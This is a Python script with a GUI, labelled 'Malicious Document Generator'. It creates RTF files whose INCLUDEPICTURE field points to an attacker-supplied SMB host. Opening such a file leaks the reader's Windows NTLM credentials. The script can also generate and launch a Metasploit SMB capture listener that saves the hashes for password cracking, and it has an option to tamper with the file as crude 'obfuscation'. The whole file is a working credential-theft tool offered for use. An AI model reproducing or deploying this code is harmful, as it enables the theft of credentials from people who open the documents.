import os
import time
import tkinter as tk
from tkinter import messagebox
import random
import string

template = r'{\rtf1{\field{\*\fldinst {INCLUDEPICTURE "file://[HOST]/[IMAGE]" \\* MERGEFORMAT\\d}}{\fldrslt}}}'
msf_script_template = '''
use auxiliary/server/capture/smb
set SRVHOST [HOST]
set JOHNPWFILE passwords
run
'''

def generateMSFScript(host):
    try:
        with open('metasploit.rc', 'w') as script:
            script.write(msf_script_template.replace('[HOST]', host))
        print('[+] Script Generated Successfully [+]')
    except Exception as e:
        print(f'[-] Error generating script: {e} [-]')
        return False
    return True

def runListener(host):
    if generateMSFScript(host):
        print('[+] Running Metasploit Auxiliary Module [+]')
        if os.system('msfconsole -q -r metasploit.rc')!= 0:
            print('[-] Error running Metasploit console [-]')
            return False
    return True

def generateDocument(host, image):
    return template.replace('[HOST]', host).replace('[IMAGE]', image)

def writeDocument(content):
    try:
        filename = str(int(time.time())) + '.rtf'
        with open(filename, 'w') as doc:
            doc.write(content)
        print(f'[+] Generated malicious file: {filename} [+]')
        return filename
    except Exception as e:
        print(f'[-] Error writing document: {e} [-]')
        return None

def obfuscateDocument(filename):
    try:
        with open(filename, 'r') as file:
            content = file.read()
        obfuscated_content = ''.join(random.choice(string.ascii_lowercase) for _ in range(10)) + content
        with open(filename, 'w') as file:
            file.write(obfuscated_content)
        print(f'[+] Document obfuscated successfully [+]')
    except Exception as e:
        print(f'[-] Error obfuscating document: {e} [-]')

class GUI:
    def __init__(self, master):
        self.master = master
        master.title("Malicious Document Generator")

        self.host_label = tk.Label(master, text="Enter the IP address:")
        self.host_label.pack()

        self.host_entry = tk.Entry(master, width=30)
        self.host_entry.pack()

        self.image_label = tk.Label(master, text="Enter the image name:")
        self.image_label.pack()

        self.image_entry = tk.Entry(master, width=30)
        self.image_entry.pack()

        self.run_msf_label = tk.Label(master, text="Run Metasploit listener?")
        self.run_msf_label.pack()

        self.run_msf_var = tk.StringVar()
        self.run_msf_yes = tk.Radiobutton(master, text="Yes", variable=self.run_msf_var, value="yes")
        self.run_msf_yes.pack()
        self.run_msf_no = tk.Radiobutton(master, text="No", variable=self.run_msf_var, value="no")
        self.run_msf_no.pack()

        self.obfuscate_label = tk.Label(master, text="Obfuscate document?")
        self.obfuscate_label.pack()

        self.obfuscate_var = tk.StringVar()
        self.obfuscate_yes = tk.Radiobutton(master, text="Yes", variable=self.obfuscate_var, value="yes")
        self.obfuscate_yes.pack()
        self.obfuscate_no = tk.Radiobutton(master, text="No", variable=self.obfuscate_var, value="no")
        self.obfuscate_no.pack()

        self.generate_button = tk.Button(master, text="Generate", command=self.generate)
        self.generate_button.pack()

    def generate(self):
        host = self.host_entry.get()
        image = self.image_entry.get()
        run_msf = self.run_msf_var.get()
        obfuscate = self.obfuscate_var.get()

        if not host or not image:
            messagebox.showerror("Error", "Please fill in all fields")
            return

        document_content = generateDocument(host, image)
        filename = writeDocument(document_content)

        if filename:
            messagebox.showinfo("Success", f"Malicious file generated: {filename}")

        if obfuscate == "yes":
            obfuscateDocument(filename)

        if run_msf == "yes":
            if runListener(host):
                messagebox.showinfo("Success", "Metasploit listener started successfully")
            else:
                messagebox.showerror("Error", "Error running Metasploit listener")

root = tk.Tk()
gui = GUI(root)
root.mainloop()

